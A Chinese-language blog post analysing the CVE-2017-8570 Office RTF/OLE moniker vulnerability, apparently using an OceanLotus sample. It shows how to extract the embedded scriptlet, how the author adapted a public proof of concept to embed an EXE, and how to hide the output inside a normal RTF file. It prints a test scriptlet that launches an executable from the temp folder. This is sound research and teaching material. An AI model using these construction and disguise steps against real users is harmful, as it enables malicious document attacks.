## 0x01 漏洞概述

> POC:[CVE-2017-8570](https://github.com/rxwx/CVE-2017-8570)

CVE-2017-8570实际上是一逻辑漏洞，该漏洞利用了OLE中Composite Moniker对象在组合File Moniker对象的过程中，未做安全性检查，以致可以直接运行File Moniker对象指定的ScriptletFile(.sct)脚本文件。

## 0x02 样本分析

以海莲花组织某样本作为示例。

> MD5:72bebba3542bd86dc68a36fda5dbae76

使用`rtfdump`工具`-f O`选项过滤RTF文档中的OLE对象：

![图片1 rtfdump](https://s1.ax1x.com/2020/08/05/ascFdx.png)

之后结合`rtfobj`分析结果判断其`.sct`脚本文件位于第213号对象中：

![图片2 rtfobj](https://s1.ax1x.com/2020/08/05/ascie1.png)

通过`-s 213 -H`进行验证：

![图片3 sct脚本文件](https://s1.ax1x.com/2020/08/05/ascVJO.png)

之后使用输出重定向将结果保存到一文本文件中：

![图片4 保存输出结果](https://s1.ax1x.com/2020/08/05/ascmSe.png)

最后由`awk`命令结合正则表达式将其中的脚本内容提取出来：

![图片5 提取脚本内容](https://s1.ax1x.com/2020/08/05/ascko6.png)

注：此时可以使用Notepad++或者Sublime对脚本内容进行排版处理，以便阅读：

![图片6 排版后](https://s1.ax1x.com/2020/08/05/ascEFK.png)

其功能为执行释放到临时目录下的VBS脚本文件。

## 0x03 样本构造

部分样本是将EXE文件以Package对象的形式包含在RTF文档内：

![图片7 EXE](https://s1.ax1x.com/2020/08/06/agTvlj.png)

之后通过SCT脚本去执行该EXE：

![图片8 SCT脚本](https://s1.ax1x.com/2020/08/06/ag7pmq.png)

笔者针对此情况对原有POC进行了改造(具体见文末)：

![图片9 修改一](https://s1.ax1x.com/2020/08/06/agTjpQ.png)

![图片10 修改二](https://s1.ax1x.com/2020/08/06/agTx6s.png)

![图片11 修改三](https://s1.ax1x.com/2020/08/06/agTzXn.png)

如此一来，便可将EXE文件以Package对象的形式嵌入到RTF文档中。

生成的RTF文档可以添加到正常RTF文档末尾`}`之前以进行伪装：

![图片12 伪装](https://s1.ax1x.com/2020/08/06/ag7900.png)

笔者用以测试的SCT脚本如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="fjzmpcjvqp"
    progid="fjzmpcjvqp"
    version="1.00"
    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[

		var r = new ActiveXObject("WScript.Shell").Run("%temp%\\write.exe");
	
	
]]>
</script>

</scriptlet>
```

其中`write.exe`是`C:\Windows\System32`目录下的正常写字板程序。效果如图：

![图片13 效果图](https://s1.ax1x.com/2020/08/06/ag7ikT.gif)

## 0x04 参阅链接

- [需要用于多行搜索的正则表达式（grep）](https://www.it-swarm.dev/zh/regex/%E9%9C%80%E8%A6%81%E7%94%A8%E4%BA%8E%E5%A4%9A%E8%A1%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88grep%EF%BC%89/970994208/)

- [CVE-2017-8570首次公开的野外样本及漏洞分析](https://paper.seebug.org/520)

- [Analysis of a CVE-2017-0199 Malicious RTF Document](https://blog.nviso.eu/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/)
